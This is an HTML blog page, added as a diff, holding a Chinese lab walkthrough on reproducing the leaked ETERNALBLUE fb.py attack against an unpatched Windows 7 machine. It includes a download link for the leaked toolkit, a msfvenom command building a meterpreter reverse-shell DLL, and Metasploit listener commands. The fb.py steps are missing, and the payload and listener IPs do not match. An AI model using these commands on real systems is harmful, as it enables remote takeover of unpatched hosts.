@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang=en>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="keywords" content>
+  
+    <link rel="icon" href>
+  
+    
+  <title>屠夫(杜昆淇)的博客</title>
+  <meta name="description" content>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <span>杜昆淇的博客</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+            <a href="http://www.butcherhelp.cn" class="item-link">屠夫新闻</a>
+        </li>
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+      <section class="content markdown-body">
+        <h1>
+          方程式ETERNALBLUE 之fb.py的复现
+        </h1>
+        <div class='post-meta'>
+          <i class="fa fa-calendar"
+            aria-hidden="true"></i> <time>
+            2017/04/24</time>
+          
+          
+        </div>
+        <p>1.环境简介<br>攻击机win2003<br>ip:192.168.1.105<br>攻击机kali:<br>ip:192.168.1.106<br>靶机（被攻击机）window7 x64(未装smb漏洞补丁）<br>ip:192.168.1.100</p>
+<p>2.windows2003攻击机<br>攻击机win2003安装环境：<br>python-2.6.6.msi<br><a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">https://www.python.org/download/releases/2.6.6/</a><br>pywin32-221.win-amd64-py2.6.exe：<br><a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</a><br>方程式ETERNALBLUE 下载地址：<br><a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="noopener">https://codeload.github.com/misterch0c/shadowbroker/zip/master</a></p>
+<p>安装好python后，需要在win2003设置环境变量：</p>
+<p>将整个ETERNALBLUE 目录下的 windows拷贝到攻击机win2003上</p>
+<p>在windows目录下建立一个文件为：listeningposts<br>运行phthon  fb.py<br>以下在攻击机win2003上执行fb.py的具体命令重要命令如下，其他命令都用回车执行。<br>= </p>
+<p>3攻击机kali上<br>利用msf生成一个dll劫持文件：<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.108.131 LPORT=5555 -f dll &gt; /opt/s.dll</p>
+<p>将s.dll文件拷贝到windows2003的C盘目录下：</p>
+<p>在msf下开启msfpaylod监听：<br>use exploit/multi/handler<br>set lhost 192.168.1.106<br>set lport 5555<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>exploit</p>
+<p>4.接着在windows2003下执行</p>
+<p>最后在msf下可以看到成功反弹shell:</p>
+
+      </section>
+    </article>
+    
+    
+  </div>
+  <aside>
+    
+  </aside>
+</main>
+
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy;
+      2019&nbsp
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/ScrollMagic.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  document.body.addEventListener('touchstart', function () { });
+
+  // 文章图片预览
+  $("article img").each(function () {
+    var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+    $(this).wrapAll(strA);
+  });
+
+  // 目录联动
+  let tocLinkList = $('.toc-link')
+
+  let controller = new ScrollMagic.Controller({
+    globalSceneOptions: {
+      triggerHook: 0.01
+    }
+  })
+
+  tocLinkList.each(function (index, elem) {
+    let href = $(this).attr("href");
+    let nextHref = tocLinkList.eq(index + 1).attr("href");
+    let height = href && nextHref ? $(nextHref).offset().top - $(href).offset().top : 0
+
+    new ScrollMagic.Scene({ triggerElement: href })
+      .duration(height)
+      .setClassToggle(".toc [href='" + href + "']", 'active')
+      .addTo(controller)
+  })
+
+  window.addEventListener('load', function () {
+    // 目录联动 图片加载完成后从新计算
+    tocLinkList.each(function (index, elem) {
+      let href = $(this).attr("href");
+      let nextHref = tocLinkList.eq(index + 1).attr("href");
+      let height = href && nextHref ? $(nextHref).offset().top - $(href).offset().top : 0
+
+      new ScrollMagic.Scene({ triggerElement: href })
+        .duration(height)
+        .setClassToggle(".toc [href='" + href + "']", 'active')
+        .addTo(controller)
+    })
+  })
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
